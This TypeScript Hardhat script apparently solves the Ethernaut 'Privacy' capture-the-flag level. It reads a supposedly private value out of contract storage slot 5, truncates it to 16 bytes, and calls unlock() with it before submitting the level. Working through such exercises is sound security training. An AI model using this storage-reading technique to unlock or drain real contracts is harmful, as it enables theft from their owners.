import { Signer } from 'ethers'
import { ethers } from 'hardhat'
import { Elevator } from '../typechain-types/Elevator'
import { ElevatorAttack } from '../typechain-types/ElevatorAttack'
import { Privacy } from '../typechain-types/Privacy'
import { loadOrCreateLevelInstance, submitLevelInstance } from './ethernaut'
import { loadOrDeployContract } from './helpers'

const levelAddress = '0x11343d543778213221516D004ED82C45C3c8788B'

const main = async () => {
  const signer = (await ethers.getSigners())[0] as Signer

  const targetContract = (await loadOrCreateLevelInstance('Privacy', levelAddress, signer)) as Privacy

  const data = await ethers.provider.getStorageAt(targetContract.address, 5)
  const array = ethers.utils.arrayify(data)
  console.log({ data })
  console.log({ array })

  const password = ethers.utils.hexlify(array.slice(0, 16))

  console.log({ password })

  const attackTx = await targetContract.unlock(password)

  console.log('Attack tx hash', attackTx.hash)
  await attackTx.wait()

  await submitLevelInstance(targetContract.address, signer)
}

main()
  .then(() => process.exit())
  .catch(e => {
    console.error(e)
    process.exit(1)
  })
